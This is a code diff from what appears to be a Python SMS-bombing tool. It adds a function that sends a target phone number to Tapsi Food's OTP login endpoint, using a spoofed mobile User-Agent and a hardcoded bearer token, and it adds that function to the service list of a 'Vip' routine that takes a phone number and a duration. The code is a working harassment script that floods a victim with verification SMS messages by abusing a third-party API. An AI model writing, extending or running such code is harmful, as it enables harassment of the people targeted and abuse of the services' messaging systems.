@@ -57,6 +57,44 @@ def check_internet():
 
 
 
+def tapsi_food(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://api.tapsi.food/v1/api/Authentication/otp"
+    
+    payload = {
+        "cellPhone": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiZTc4ZjIwMzgtZjgzNi00MDA2LThjYzItYTYzY2YzMmI2OWY5IiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTc1NjI0Mzc1OCwiZXhwIjoxNzU2MjU0NTU4LCJpYXQiOjE3NTYyNDM3NTgsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.FJnYvqwBa9za2y0SGANgFg_3PGNLeZkeCDPebJS0YTE",
+        "x-platform": "mobile",
+        "x-app-version": "v1.5.12-prd",
+        "Origin": "https://tapsi.food",
+        "Referer": "https://tapsi.food/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(tapsi_food) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (tapsi_food) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] tapsi_food Exception: {e}{a}')
+        return False
+
 
 def banimode(phone):
     import requests
@@ -115,7 +153,8 @@ def send_service_safe(service, phone):
 # ------------------------------
 def Vip(phone, Time):
     services = [
-    banimode,  # تنها سرویس
+    banimode,
+    tapsi_food,  # اضافه کردن این خط
 ]
     total_services = len(services)
 
